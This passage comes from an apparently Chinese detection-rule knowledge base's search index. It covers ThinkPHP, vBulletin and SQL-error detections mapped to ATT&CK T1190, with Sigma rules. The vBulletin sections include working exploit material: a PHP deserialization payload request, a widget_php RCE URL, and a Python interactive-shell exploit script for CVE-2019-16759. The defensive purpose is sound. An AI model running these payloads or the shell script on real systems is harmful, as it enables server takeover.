'ok';?&gt;\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\ndescription: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7orHttp.log\u68c0\u6d4bThinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\ntranslator: 12306Bro\ndate: 2020/12/12\nstatus: experimental\nreferences:\n    - https://www.cnblogs.com/backlion/p/10106676.html\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        c-uri:\n            - '/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_8","title":"\u5907\u6ce8","text":"<p>\u5728\u5177\u4f53\u4e1a\u52a1\u573a\u666f\u4e0b\u9047\u5230\uff0c\u7279\u8bb0\u5f55\u3002\u53ef\u4ee5\u6839\u636e\u5177\u4f53payload\u6765\u5224\u65ad\u662f\u5426\u4e3a\u771f\u5b9e\u653b\u51fb\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a</p> <p>https://www.cnblogs.com/backlion/p/10106676.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/","title":"T1190-vBulletin5.X-RCE\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#cve-2015-7808","title":"CVE-2015-7808\u6f0f\u6d1e","text":"<p>vBulletin\u662f\u7528PHP\u7f16\u5199\u7684\u53ef\u5b9a\u5236\u7684\u8bba\u575b\u7a0b\u5e8f\u5957\u4ef6\u3002</p> <p>vBulletin 5.1.4-5.1.9\u7248\u672c\uff0c\u67d0\u4e9b\u5185\u90e8API\u5904\u7406Ajax\u8bf7\u6c42\u65f6\uff0c\u672a\u9a8c\u8bc1\u5176\u6765\u6e90\uff0c\u8fd9\u53ef\u4f7f\u653b\u51fb\u8005\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u8c03\u7528\u7ee7\u627f\u81eavB_Api\u53ca/core/vb/api/\u4e0b\u4efb\u610f\u7c7b\u7684\u4efb\u610f\u516c\u5171\u65b9\u6cd5\uff0c\u5176\u4e2ddecodeArguments()\u65b9\u6cd5\u5185\u7684unserialize()\u51fd\u6570\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u4f7f\u653b\u51fb\u8005\u5728\u2018$args\u2019\u53d8\u91cf\u4e2d\u6ce8\u5165\u7cbe\u5fc3\u6784\u9020\u7684\u4efb\u610f\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u6267\u884cphp\u4ee3\u7801\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>VBulletin 5.1.4 - 5.1.9</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_2","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bf7\u53c2\u8003\uff1a</p> <p>vBulletin5.X\u524d\u53f0RCE\u5206\u6790\uff08CVE-2015-7808\uff09</p> <p>https://xz.aliyun.com/t/6497</p> <p>vBulletin 5 \u5168\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790</p> <p>https://www.anquanke.com/post/id/82870</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u8bbf\u95ee\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D HTTP/1.1\nHost: 192.168.0.106\nCookie: XDEBUG_SESSION=PHPSTORM\nConnection: close\n</code></pre> <p>\u89e3\u7801\u540e\uff1a</p> <pre><code>GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O:12:\"vB_dB_Result\":2:{s:5:\"*db\";O:17:\"vB_Database_MySQL\":1:{s:9:\"functions\";a:1:{s:11:\"free_result\";s:6:\"assert\";}}s:12:\"*recordset\";s:9:\"phpinfo()\";} HTTP/1.1\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>sigma\u89c4\u5219</p> <pre><code>title: vBulletin5.X-CVE-2015-7808-RCE-\u68c0\u6d4b\u89c4\u5219\ndescription: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7\u68c0\u6d4bCVE-2015-7808\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\ntranslator: 12306Bro\ndate: 2020/12/16\nstatus: experimental\nreferences:\n    - https://xz.aliyun.com/t/6497\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        c-uri:\n            - '*/ajax/api/hook/decodeArguments?arguments=*'\n    condition: selection\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#cve-2019-16759","title":"CVE-2019-16759","text":"<p>\u8fd1\u671f\uff0cvBulletin\u62ab\u9732\u4e86\u4e00\u4e2a\u6700\u65b0\u76840 day\u6f0f\u6d1e\u7ec6\u8282\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5206\u914d\u7684CVE\u7f16\u53f7\u4e3aCVE-2019-16759\u3002\u4e0e\u6b64\u540c\u65f6\uff0cUnit 42\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4e5f\u5728\u7f51\u4e0a\u53d1\u73b0\u4e86\u6709\u5f88\u591a\u653b\u51fb\u8005\u6b63\u5728\u5229\u7528\u8be5\u6f0f\u6d1e\u6765\u5b9e\u65bd\u653b\u51fb\u3002\u5728\u8be5\u6f0f\u6d1e\u7684\u5e2e\u52a9\u4e0b\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u5c06\u80fd\u591f\u8bbf\u95ee\u548c\u63a7\u5236\u8fd0\u884c\u4e86v5.0.0\u81f3v5.5.4\u7248\u672cvBulletin\u7684\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u963b\u6b62\u7f51\u7edc\u7ba1\u7406\u5458\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\u5668\u3002\u76ee\u524d\uff0c\u4f7f\u7528\u4e86vBulletin\u7684\u7f51\u7ad9\u6570\u91cf\u5927\u7ea6\u670910\u4e07\u591a\u4e2a\uff0c\u5176\u4e2d\u5305\u62ec\u5f88\u591a\u5927\u578b\u4f01\u4e1a\u3001\u7ec4\u7ec7\u548c\u8bba\u575b\uff0c\u56e0\u6b64\u8be5\u6f0f\u6d1e\u5e94\u5f53\u7acb\u523b\u88ab\u4fee\u590d\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_7","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u4ec5\u5f71\u54cd vBulletin 5.x \u7248\u672c</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_8","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bf7\u53c2\u8003\uff1a</p> <p>CVE-2019-16759\u6f0f\u6d1e\u5728\u91ce\u5229\u7528</p> <p>https://www.anquanke.com/post/id/189470</p> <p>CVE-2019-16759 vBulletin 5.x RCE \u590d\u73b0</p> <p>https://blog.csdn.net/weixin_41064688/article/details/108060313</p> <p>CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e</p> <p>https://github.com/jas502n/CVE-2019-16759</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_9","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u8bbf\u95ee\u65e5\u5fd7 OR HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_10","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>POC1</p> <pre><code>http://IP/?routestring=ajax%2Frender%2Fwidget_php&amp;widgetConfig[code]=phpinfo();exit;\n</code></pre> <p>POC2:CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e</p> <pre><code>import requests\nimport sys\n\nif len(sys.argv) != 2:\n    sys.exit(\"Usage: %s &lt;URL to vBulletin&gt;\" % sys.argv[0])\n\nproxies ={\n     \"http\":\"http://127.0.0.1:8080/\"\n}\nparams = {\"routestring\":\"ajax/render/widget_php\"}\n\nwhile True:\n     try:\n          cmd = raw_input(\"&gt;&gt;&gt;Shell= \")\n          params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"');echo md5('vBulletin'); exit;\"\n          r = requests.post(url = sys.argv[1], data = params, proxies=proxies)\n          if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text:\n               print\n               print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0]\n          else:\n               sys.exit(\"Exploit failed! :(\")\n     except KeyboardInterrupt:\n          sys.exit(\"\\nClosing shell...\")\n     except Exception, e:\n          sys.exit(str(e))\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_11","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4f46\u53ef\u67e5\u770b\u653b\u51fb\u62a5\u6587\u6837\u4f8b\u8f85\u52a9\u5b89\u5168\u4eba\u5458\u7814\u5224\u662f\u5426\u4e3a\u653b\u51fb\u884c\u4e3a\uff0c\u8f83\u7b80\u5355\u7684\u573a\u666f\u3002</p> <p>https://github.com/jas502n/CVE-2019-16759</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_12","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>sigma\u89c4\u5219</p> <pre><code>title: vBulletin5.X-CVE-2015-7808-RCE-\u68c0\u6d4b\u89c4\u5219\ndescription: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7\u68c0\u6d4bCVE-2015-7808\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a\ntranslator: 12306Bro\ndate: 2020/12/16\nstatus: experimental\nreferences:\n    - https://github.com/jas502n/CVE-2019-16759\n    - https://blog.csdn.net/weixin_41064688/article/details/108060313\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        c-uri:\n            - '*?routestring=ajax%2Frender%2Fwidget_php&amp;widgetConfig*' #\u5339\u914d\u6b64\u7279\u5f81\n    selection2:\n        body:\n            - '*routestring=ajax/render/widget_php&amp;widgetConfig[code]=die(@mid5(*))' #\u6839\u636e\u62a5\u6587\u5185\u5bb9\u8fdb\u884c\u5224\u65ad\uff0c\u591a\u4e3apost\n    condition: selection1 or selection2\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_13","title":"\u5907\u6ce8","text":"<p>\u5728\u8fdb\u884c\u90e8\u5206\u653b\u51fb\u65e5\u5fd7\u5206\u6790\u65f6\uff0c\u9047\u5230\u6b64\u6f0f\u6d1e\u7279\u5f81\uff0c\u4ec5\u505a\u8bb0\u5f55\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/#_14","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>vBulletin5.X\u524d\u53f0RCE\u5206\u6790\uff08CVE-2015-7808\uff09</p> <p>https://xz.aliyun.com/t/6497</p> <p>vBulletin 5 \u5168\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790</p> <p>https://www.anquanke.com/post/id/82870</p> <p>CVE-2019-16759\u6f0f\u6d1e\u5728\u91ce\u5229\u7528</p> <p>https://www.anquanke.com/post/id/189470</p> <p>CVE-2019-16759 vBulletin 5.x RCE \u590d\u73b0</p> <p>https://blog.csdn.net/weixin_41064688/article/details/108060313</p> <p>CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e</p> <p>https://github.com/jas502n/CVE-2019-16759</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/","title":"T1190-\u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#attck","title":"ATT&amp;CK\u63cf\u8ff0","text":"<p>\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u5229\u7528\u6307\u7684\u662f\u653b\u51fb\u8005\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u7684\u5f31\u70b9\uff0c\u4f7f\u7528\u8f6f\u4ef6\u3001\u6570\u636e\u6216\u547d\u4ee4\u6765\u9020\u6210\u610f\u5916\u884c\u4e3a\u3002\u7cfb\u7edf\u5f31\u70b9\u53ef\u80fd\u662f\u7f3a\u9677\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u4e5f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u5982SMB\u6216SSH\uff09\uff0c\u4ee5\u53ca\u4efb\u4f55\u5e26\u6709\u53ef\u901a\u8fc7Internet\u8bbf\u95ee\u7684\u5f00\u653e\u5957\u63a5\u5b57\u7684\u5e94\u7528\uff08\u5982web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\uff09\u3002\u9762\u5411\u516c\u4f17\u5e94\u7528\u7684\u5229\u7528\u53ef\u80fd\u5305\u62ec\u9632\u5fa1\u9003\u9038\u76ee\u7684\u7684\u5229\u7528\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u88ab\u5229\u7528\u7684\u5f31\u70b9\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u4e91\u5316\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5229\u7528\u6b64\u5e94\u7528\u53ef\u80fd\u4f1a\u7834\u574f\u5e95\u5c42\u5b9e\u4f8b\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u6f0f\u6d1e\u901a\u8fc7\u8c03\u7528\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u6765\u5b9e\u65bd\u653b\u51fb\u3002</p> <p>OWASP\uff08\u5f00\u653e\u5f0fweb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u9879\u76ee\uff09\u524d10\u540d\u548cCWE\uff08\u901a\u7528\u7f3a\u9677\u5217\u8868\uff09\u524d25\u540d\u7a81\u51fa\u663e\u793a\u4e86\u7f51\u7ad9\u548c\u6570\u636e\u5e93\u6700\u5e38\u89c1\u7684web\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u6570\u636e\u5e93\u9519\u8bef\u65e5\u5fd7</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>Oracle\u62a5\u9519\u4fe1\u606f</p> <pre><code>quoted string not properly terminated\n</code></pre> <p>MySQL\u62a5\u9519\u4fe1\u606f</p> <pre><code>You have an error in your SQL syntax\n</code></pre> <p>SQL Server\u62a5\u9519\u4fe1\u606f</p> <pre><code>Unclosed quotation mark\n</code></pre> <p>SQLite\u62a5\u9519\u4fe1\u606f</p> <pre><code>'near \"*\": syntax error'\n\nSELECTs to the left and right of UNION do not have the same number of result columns\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#sigma","title":"Sigma\u89c4\u5219","text":"<pre><code>title: \u53ef\u7591\u7684SQL\u9519\u8bef\u6d88\u606f\nstatus: \u5b9e\u9a8c\u9636\u6bb5\ndescription: \u68c0\u6d4b\u6307\u793a\u5bf9\u6ce8\u5165\u653b\u51fb\u8fdb\u884c\u63a2\u6d4b\u7684SQL\u9519\u8bef\u6d88\u606f\nauthor: Bjoern Kimminich\nTranslator: 12306Bro\ndate: 2020/8/6\nreferences:\n    - http://www.sqlinjection.net/errors\nlogsource:\n    category: application\n    product: sql\ndetection:\n    keywords:\n        # Oracle\n        - quoted string not properly terminated\n        # MySQL\n        - You have an error in your SQL syntax\n        # SQL Server\n        - Unclosed quotation mark\n        # SQLite\n        - 'near \"*\": syntax error'\n        - SELECTs to the left and right of UNION do not have the same number of result columns\n    condition: keywords\nfalsepositives:\n    - Application bugs\nlevel: high\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E5%8F%AF%E7%96%91%E7%9A%84SQL%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>Oracle\u62a5\u9519\u4fe1\u606f</p> <p>https://blog.csdn.net/rshp_520/article/details/44620463</p> <p>MySQL\u62a5\u9519\u4fe1\u606f</p> <p>https://blog.csdn.net/attack_5/article/details/83548346</p> <p>SQL Server\u62a5\u9519\u4fe1\u606f</p> <p>https://blog.csdn.net/dadaowuque/article/details/81016127</p> <p>SQLite\u62a5\u9519\u4fe1\u606f</p> <p>https://blog.csdn.net/www121104115/article/details/75051685</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/","title":"T1190-\u901a\u8fbeV11.6-RCE\u6f0f\u6d1e","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%80%9A%E8%BE%BEV11.6-RCE/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c \u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> 